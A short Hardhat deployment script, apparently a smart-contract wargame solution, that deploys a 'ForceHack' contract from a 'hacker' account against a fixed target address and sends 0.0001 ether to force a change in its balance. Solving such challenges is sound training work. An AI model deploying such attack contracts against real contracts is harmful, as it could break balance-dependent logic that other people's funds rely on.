const hre = require("hardhat")
const {utils} = require("ethers")
const {ethers} = require("hardhat")

async function main() {

    const account = await ethers.getSigners();

    const hacker_account = account[0]

    console.log("Hacker Account balance:", (await hacker_account.getBalance()).toString());
    
    const force_hack = await ethers.getContractFactory("ForceHack", hacker_account);
    console.log("Force Hack Deploying")
    let force_addr = '0x7c60F9644e78DE99e2E7A2c04B4146432F705b39'  
    const d_hack = await force_hack.deploy(force_addr)
    console.log("Force Hack Deployed")
    
    let con_bal = await ethers.provider.getBalance(force_addr);
    console.log("Balance Before")
    console.log(con_bal)

    await d_hack.connect(hacker_account).giveValue({value: ethers.utils.parseEther("0.0001")});
    

    con_bal = await ethers.provider.getBalance(force_addr);
    console.log("Balance After")
    console.log(con_bal)


}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});